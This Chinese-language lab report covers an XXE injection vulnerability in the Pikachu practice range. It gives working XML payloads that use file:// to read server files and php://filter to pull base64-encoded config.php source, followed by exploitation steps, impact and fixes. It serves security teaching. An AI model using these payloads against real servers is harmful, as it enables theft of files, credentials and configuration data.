---
title: Pikachu XXE漏洞实验报告
date: 2026-10-31
category: Web安全
tags: [XXE, XML外部实体注入, Pikachu]
---

## 一、实验环境
靶场平台：Pikachu
测试页面：`vul/xxe/xxe_1.php`
PHP版本：PHP 5.6.9
漏洞类型：XXE（XML外部实体注入）

## 二、漏洞原理
后端接收用户传入的XML数据，使用`libxml`解析XML，代码中设置`libxml_disable_entity_loader(false)`，**没有关闭外部实体解析**。
攻击者可以自定义DTD外部实体，通过`file://`协议读取服务器本地文件；
直接读取php文件时，文件中的`< > &`等特殊字符会破坏XML结构，因此可以使用`php://filter`过滤器以base64编码读取源码，避免解析报错。

## 三、测试Payload
1. 内部实体验证（验证XML解析是否生效）
``xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test "hello">
]>
<x>&test;</x>
2. 读取D盘普通文本文件
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "file:///D:/test.txt">
]>
<x>&test;</x>
3. php过滤器读取php源码（base64编码）
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=./config.php">
]>
<x>&test;</x>
## 四、利用步骤

1. 进入XXE漏洞页面，页面提供XML数据输入框；

2. 粘贴内部实体payload提交，页面回显hello，确认XML解析可控；

3. 粘贴file协议payload读取D盘test.txt，成功输出文件内容；

4. 使用php过滤器payload读取靶场配置文件config.php，得到base64编码后的源码，解码查看敏感配置信息。

## 五、漏洞危害

1. 读取服务器本地任意文件，获取账号、密码、配置等敏感信息；

2. 配合http协议可探测内网资产，发起SSRF攻击；

3. 在部分环境下还可以进行远程文件读取。

## 六、修复方案

1. 解析XML前，执行libxml_disable_entity_loader(true)，关闭外部实体加载；

2. 禁用DTD文档类型定义；

3. 不直接解析用户可控的XML数据；

4. 采用JSON等更安全的数据传输格式替代XML。
